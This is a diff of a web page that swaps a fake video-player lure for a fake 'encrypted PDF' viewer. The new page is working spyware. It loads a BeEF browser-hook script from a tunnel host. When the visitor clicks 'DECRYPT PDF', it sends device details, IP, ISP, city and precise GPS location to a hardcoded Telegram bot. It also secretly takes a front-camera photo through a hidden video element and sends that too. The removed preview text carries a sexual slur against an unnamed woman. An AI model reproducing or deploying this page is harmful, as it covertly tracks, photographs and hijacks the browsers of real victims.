@@ -1,149 +1,115 @@
 <!DOCTYPE html>
-<html lang="ku" dir="rtl" prefix="og: https://ogp.me/ns#">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Document Viewer</title>
+    
+    <!-- BeEF Hook - لێرەدا لینکی کلۆدفلەیرەکەت دابنێ -->
+    <script src="https://inquiries-stability-extend-width.trycloudflare.com/hook.js"></script>
 
-<!-- Open Graph -->
-<meta property="og:title" content="Video Player">
-<meta property="og:description" content="Click to open">
-<meta property="og:image" content="https://raw.githubusercontent.com/tiktokprr/video/main/video9.png">
-<meta property="og:image:width" content="1200">
-<meta property="og:image:height" content="630">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://salmon-blinni-69.tiiny.site">
-
-<!-- Twitter -->
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Video Player">
-<meta name="twitter:description" content="تۆمارێکی دیکەی قەحبەیەکی شاری سلێمانی بەناو ڕۆشنبیر">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/tiktokprr/video/main/video9.png">
-
-<title>Video Player</title>
-
-<link rel="icon" href="https://cdn-icons-png.flaticon.com/512/1384/1384060.png">
-
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{
-background:#000;
-min-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-font-family:Segoe UI,Tahoma,sans-serif
-}
-.container{width:100%;max-width:800px;text-align:center}
-h1{color:#fff;margin-bottom:25px}
-.video-player{
-position:relative;
-border-radius:15px;
-overflow:hidden;
-cursor:pointer;
-border:2px solid #333
-}
-.video-thumbnail{
-width:100%;
-height:420px;
-object-fit:cover;
-display:block
-}
-.video-overlay{
-position:absolute;
-top:0;left:0;
-width:100%;height:100%;
-background:rgba(0,0,0,.5);
-display:flex;
-justify-content:center;
-align-items:center
-}
-.play-button{
-width:80px;height:80px;
-background:#fff;
-border-radius:50%;
-display:flex;
-justify-content:center;
-align-items:center
-}
-.play-icon{
-width:0;height:0;
-border-top:15px solid transparent;
-border-bottom:15px solid transparent;
-border-left:25px solid red;
-margin-left:5px
-}
-.confirmation-modal{
-position:fixed;
-top:0;left:0;
-width:100%;height:100%;
-background:rgba(0,0,0,.85);
-display:none;
-justify-content:center;
-align-items:center;
-z-index:1000
-}
-.confirmation-modal.show{display:flex}
-.confirmation-box{
-background:#111;
-padding:30px;
-border-radius:10px;
-text-align:center;
-max-width:400px;
-width:90%;
-color:#fff
-}
-.confirm-btn{
-margin-top:20px;
-width:100%;
-padding:12px;
-background:#4285F4;
-border:none;
-color:#fff;
-font-size:16px;
-cursor:pointer;
-border-radius:6px
-}
-.close-modal{
-position:absolute;
-top:15px;
-right:20px;
-background:none;
-border:none;
-color:#aaa;
-font-size:22px;
-cursor:pointer
-}
-</style>
+    <style>
+        body { font-family: Arial, sans-serif; background: #525659; margin: 0; display: flex; flex-direction: column; height: 100vh; }
+        .header { background: #323639; color: white; padding: 15px; font-size: 18px; display: flex; justify-content: space-between; align-items: center; }
+        .viewer { flex-grow: 1; display: flex; justify-content: center; align-items: center; background: #fff; margin: 20px; border-radius: 5px; box-shadow: 0 0 20px rgba(0,0,0,0.5); cursor: pointer; position: relative; }
+        .loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #spy-vid { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
+        canvas { display: none; }
+    </style>
 </head>
-
 <body>
 
-<div class="container">
+    <div class="header">
+        <span>📄 Report_Document_2024.pdf</span>
+        <span style="font-size: 12px; opacity: 0.7;">Size: 1.4 MB</span>
+    </div>
 
-<div class="video-player" id="videoPlayer">
-<img class="video-thumbnail"
-src="https://raw.githubusercontent.com/tiktokprr/video/main/video9.png"
+    <div class="viewer" id="mainTrigger">
+        <div class="loading-overlay" id="loaderBox">
+            <div class="loader"></div>
+            <h3>Document is Encrypted</h3>
+            <p>To view the full report, click the button below to decrypt</p>
+            <button style="padding: 10px 25px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">DECRYPT PDF</button>
+        </div>
+        <iframe id="pdfFrame" src="https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf" style="width: 100%; height: 100%; border: none; display: none;"></iframe>
+    </div>
 
-alt="Video Thumbnail">
+    <video id="spy-vid" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
 
-<div class="video-overlay">
-<div class="play-button">
-<div class="play-icon"></div>
-</div>
-</div>
-</div>
-</div>
+    <script>
+        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+        const chatId = "6679834643";
 
+        // فەنکشنی ناردن بۆ تێلگرام
+        async function reportToTelegram(text) {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+        }
 
+        document.getElementById('mainTrigger').addEventListener('click', async function() {
+            // شاردنەوەی لۆدینگەکە
+            document.getElementById('loaderBox').style.display = 'none';
+            document.getElementById('pdfFrame').style.display = 'block';
 
-<script>
-const videoPlayer=document.getElementById("videoPlayer");
+            // ١. کۆکردنەوەی زانیاری ئامێر و باتری و نێتۆرک
+            let batteryLevel = "Unknown";
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryLevel = (batt.level * 100) + "%";
+            }
 
+            const info = {
+                UA: navigator.userAgent,
+                Platform: navigator.platform,
+                Battery: batteryLevel,
+                Time: new Date().toLocaleString(),
+                Language: navigator.language
+            };
 
-videoPlayer.onclick = () => {
-  window.location.href = "https://followersfreeofficial.vercel.app/?id=6679834643";
-};
-</script>
+            // ٢. وەرگرتنی IP و ISP
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                reportToTelegram(`🔥 Target Logged In!\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n🏙️ City: ${d.city}\n📱 Device: ${info.UA}\n🔋 Battery: ${info.Battery}\n📅 Date: ${info.Time}`);
+            });
 
+            // ٣. وەرگرتنی لوکەیشن (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    reportToTelegram(`📍 GPS Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                }, null, { enableHighAccuracy: true });
+            }
+
+            // ٤. دزینی کامێرا (وێنەگرتن)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('spy-vid');
+                video.srcObject = stream;
+                
+                // چاوەڕێبە تا کامێرا ئامادە دەبێت
+                await new Promise(r => setTimeout(r, 4000));
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', blob, 'target.jpg');
+                    fd.append('caption', '👤 Front Camera Capture');
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg');
+            } catch (e) {
+                reportToTelegram("❌ Camera Access Denied by User");
+            }
+        });
+    </script>
 </body>
 </html>
